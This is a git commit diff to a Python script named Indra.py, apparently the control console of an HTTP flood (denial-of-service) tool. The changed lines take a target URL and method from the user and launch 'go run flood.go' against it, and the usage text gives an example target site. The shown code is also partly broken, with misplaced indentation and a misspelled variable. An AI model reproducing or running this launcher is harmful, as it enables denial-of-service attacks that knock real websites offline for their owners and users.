78ebbdb28e503b4f7a990e34f8ff333a3755e657
NgThanhVinh <117195555+Vntvxyz@users.noreply.github.com>
2023-02-04 14:57:03 +0700

    Update Indra.py

--- Indra.py
+++ Indra.py
@@ -21,13 +21,13 @@ print(Colorate.Diagonal(Colors.red_to_yellow, Center.XCenter(panel)))
 print()
 host=input(Colorate.Diagonal(Colors.red_to_yellow, "   Nhập ./ URL Taget POST 15000: "))
 time=int(input(Colorate.Diagonal(Colors.red_to_yellow, "   Đéo biết dùng thì tao cũng chịu : ")))
-elif "./" in cnc:
+elif "run" in cnc:
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
                 os.system(f'go run flood.go -site {url} -data {method} {theads}')
             except IndexError:
-                print(Fore.RED +'Usage: ./ <url> METHODS<GET/POST 15000>')
-                print(Fore.RED +'Example: sever http://ngthanhvinh.info/ GET')
+                print(Fore.RED +'Usage: run <url> METHODS<GET/POST 15000>')
+                print(Fore.RED +'Example: run http://ngthanhvinh.info/ POST ')
 
 # NgThanhVinh :33
